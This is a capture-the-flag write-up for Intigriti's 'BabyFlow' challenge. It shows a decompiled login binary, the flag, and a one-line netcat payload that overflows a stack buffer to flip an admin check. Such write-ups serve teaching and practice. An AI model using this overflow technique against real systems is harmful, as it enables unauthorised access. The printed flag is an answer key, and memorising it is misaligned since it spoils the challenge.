# BabyFlow [438 Solves]

## Description

> Does this login application even work?!
>
> `nc babyflow.ctf.intigriti.io 1331`
>
> Attachments: babyflow

## Flag

INTIGRITI{b4bypwn_9cdfb439c7876e703e307864c9167a15}

## Solution

```console
$ file babyflow
babyflow: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=55a6fe0ff25ff287549a03eb79dd00df541ece7f, for GNU/Linux 3.2.0, not stripped
```

Decompiled with Ghidra:

```c
undefined8 main(void)

{
  int iVar1;
  char local_38 [44];
  int local_c;
  
  local_c = 0;
  printf("Enter password: ");
  fgets(local_38,0x32,stdin);
  iVar1 = strncmp(local_38,"SuPeRsEcUrEPaSsWoRd123",0x16);
  if (iVar1 == 0) {
    puts("Correct Password!");
    if (local_c == 0) {
      puts("Are you sure you are admin? o.O");
    }
    else {
      puts("INTIGRITI{the_flag_is_different_on_remote}");
    }
  }
  else {
    puts("Incorrect Password!");
  }
  return 0;
}
```

Overwrite local_c with Buffer Over Flow.

```console
$ echo 'SuPeRsEcUrEPaSsWoRd123AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' | nc babyflow.ctf.intigriti.io 1331
Enter password: Correct Password!
INTIGRITI{b4bypwn_9cdfb439c7876e703e307864c9167a15}
```
